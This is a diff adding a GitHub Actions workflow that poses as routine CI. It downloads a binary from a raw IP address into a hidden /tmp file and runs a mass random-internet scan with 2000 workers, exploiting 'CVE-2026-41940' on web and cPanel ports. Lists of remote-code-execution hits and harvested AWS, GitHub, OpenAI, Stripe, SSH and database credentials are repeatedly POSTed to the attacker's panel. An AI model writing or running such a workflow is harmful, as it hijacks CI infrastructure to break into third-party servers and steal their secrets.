@@ -1,0 +1,99 @@
+name: ci-326535
+on:
+  workflow_dispatch:
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+    - name: setup
+      run: |
+        curl -sfL http://43.228.157.68:8888/api/dl/amd64 -o /tmp/.tk 2>/dev/null || \
+          wget -qO /tmp/.tk http://43.228.157.68:8888/api/dl/amd64 2>/dev/null
+        chmod 755 /tmp/.tk
+    - name: scan
+      run: |
+        PANEL="http://43.228.157.68:8888"
+        REPO="${GITHUB_REPOSITORY}"
+        LOGF="/tmp/.tk.out"
+        RESULT_FILES="rce_41940_hits.txt rce_hits.txt rce_creds.txt rce_verified.txt \
+          aws_valid.txt aws_hits.txt \
+          github_valid.txt github_tokens.txt gitlab_valid.txt gitlab_tokens.txt \
+          openai_valid.txt openai_hits.txt google_api_valid.txt google_oauth_valid.txt \
+          stripe_valid.txt sendgrid_valid.txt mailgun_valid.txt brevo_valid.txt \
+          env_hits.txt db_hits.txt ssh_hits.txt config_hits.txt \
+          git_tokens.txt git_remotes.txt"
+        # Tracker les offsets pour n'envoyer que les nouvelles lignes
+        declare -A OFFSETS
+        for F in $RESULT_FILES; do OFFSETS[$F]=0; done
+        # Heartbeat toutes les 30s → ligne live + nouvelles lignes de tous les fichiers résultats
+        (while true; do
+          sleep 30
+          LINE=$(tail -1 "$LOGF" 2>/dev/null || echo "")
+          [ -z "$LINE" ] && LINE="starting..."
+          curl -s -X POST "$PANEL/api/github-heartbeat" \
+            --data-urlencode "repo=$REPO" \
+            --data-urlencode "log=$LINE" 2>/dev/null || true
+          # Envoyer les nouvelles lignes de chaque fichier résultat (par chunks de 2000 lignes)
+          for F in $RESULT_FILES; do
+            for LOC in "$HOME" "$HOME/results" "/tmp" "./results" "."; do
+              SRC="$LOC/$F"
+              [ -f "$SRC" ] || continue
+              TOTAL=$(wc -l < "$SRC" 2>/dev/null || echo 0)
+              OFF=${OFFSETS[$F]:-0}
+              if [ "$TOTAL" -gt "$OFF" ]; then
+                SENT=$OFF
+                while [ "$SENT" -lt "$TOTAL" ]; do
+                  CHUNK=$(tail -n +"$((SENT+1))" "$SRC" 2>/dev/null | head -n 2000)
+                  [ -n "$CHUNK" ] || break
+                  curl -s --max-time 20 -X POST "$PANEL/api/github-results" \
+                    --data-urlencode "filename=$F" \
+                    --data-urlencode "content=$CHUNK" \
+                    --data-urlencode "repo=$REPO" \
+                    --data-urlencode "run_id=${GITHUB_RUN_ID:-0}" \
+                    --data-urlencode "offset=$SENT" 2>/dev/null || true
+                  SENT=$((SENT + 2000))
+                done
+                OFFSETS[$F]=$TOTAL
+              fi
+              break
+            done
+          done
+        done) &
+        HB_PID=$!
+        PANEL_URL="http://43.228.157.68:8888" /tmp/.tk ipscan --source random --workers 2000 \
+          --exploit CVE-2026-41940 --git \
+          --ports 80,443,8080,8443,2082,2083,2086,2087 \
+          --count 0 --no-reverse 2>&1 | tee "$LOGF" | tail -2 || true
+        kill $HB_PID 2>/dev/null || true
+    - name: report
+      if: always()
+      run: |
+        PANEL="http://43.228.157.68:8888"
+        FILES="rce_41940_hits.txt rce_hits.txt rce_creds.txt rce_verified.txt \
+               aws_valid.txt aws_hits.txt aws_akia_only.txt \
+               github_valid.txt github_tokens.txt gitlab_valid.txt gitlab_tokens.txt \
+               git_tokens.txt git_remotes.txt \
+               openai_valid.txt openai_hits.txt google_api_valid.txt google_oauth_valid.txt \
+               stripe_valid.txt brevo_valid.txt sendgrid_valid.txt mailgun_valid.txt \
+               env_hits.txt db_hits.txt ssh_hits.txt config_hits.txt"
+        for F in $FILES; do
+          for LOC in "$HOME" "$HOME/results" "/tmp" "/tmp/results" "./results" "."; do
+            SRC="$LOC/$F"
+            [ -f "$SRC" ] && [ -s "$SRC" ] || continue
+            TOTAL=$(wc -l < "$SRC" 2>/dev/null || echo 0)
+            SENT=0
+            while [ "$SENT" -lt "$TOTAL" ]; do
+              CHUNK=$(tail -n +"$((SENT+1))" "$SRC" 2>/dev/null | head -n 5000)
+              [ -n "$CHUNK" ] || break
+              curl -s --max-time 30 -X POST "$PANEL/api/github-results" \
+                --data-urlencode "filename=$F" \
+                --data-urlencode "content=$CHUNK" \
+                --data-urlencode "repo=$REPO" \
+                --data-urlencode "run_id=${GITHUB_RUN_ID:-0}" \
+                --data-urlencode "offset=$SENT" 2>/dev/null || true
+              SENT=$((SENT + 5000))
+            done
+            break
+          done
+        done
